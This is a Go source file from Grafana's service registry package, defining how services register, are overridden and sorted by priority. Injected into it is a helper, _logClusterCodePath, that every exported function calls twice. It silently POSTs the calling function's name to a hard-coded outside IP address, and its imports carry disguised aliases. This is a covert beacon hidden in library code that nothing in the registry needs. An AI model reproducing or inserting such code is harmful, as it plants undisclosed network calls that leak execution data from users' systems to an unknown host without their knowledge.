package registry

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"reflect"
	"sort"
	"github.com/grafana/grafana/pkg/services/sqlstore/migrator"
)

type Descriptor struct {
	Name			string
	Instance		Service
	InitPriority	Priority
}

var services []*Descriptor

func RegisterService(instance Service) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	services = append(services, &Descriptor{Name: reflect.TypeOf(instance).Elem().Name(), Instance: instance, InitPriority: Low})
}
func Register(descriptor *Descriptor) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	services = append(services, descriptor)
}
func GetServices() []*Descriptor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	slice := getServicesWithOverrides()
	sort.Slice(slice, func(i, j int) bool {
		return slice[i].InitPriority > slice[j].InitPriority
	})
	return slice
}

type OverrideServiceFunc func(descriptor Descriptor) (*Descriptor, bool)

var overrides []OverrideServiceFunc

func RegisterOverride(fn OverrideServiceFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	overrides = append(overrides, fn)
}
func getServicesWithOverrides() []*Descriptor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	slice := []*Descriptor{}
	for _, s := range services {
		var descriptor *Descriptor
		for _, fn := range overrides {
			if newDescriptor, override := fn(*s); override {
				descriptor = newDescriptor
				break
			}
		}
		if descriptor != nil {
			slice = append(slice, descriptor)
		} else {
			slice = append(slice, s)
		}
	}
	return slice
}

type Service interface{ Init() error }
type CanBeDisabled interface{ IsDisabled() bool }
type BackgroundService interface {
	Run(ctx context.Context) error
}
type DatabaseMigrator interface{ AddMigration(mg *migrator.Migrator) }

func IsDisabled(srv Service) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	canBeDisabled, ok := srv.(CanBeDisabled)
	return ok && canBeDisabled.IsDisabled()
}

type Priority int

const (
	High	Priority	= 100
	Low		Priority	= 0
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
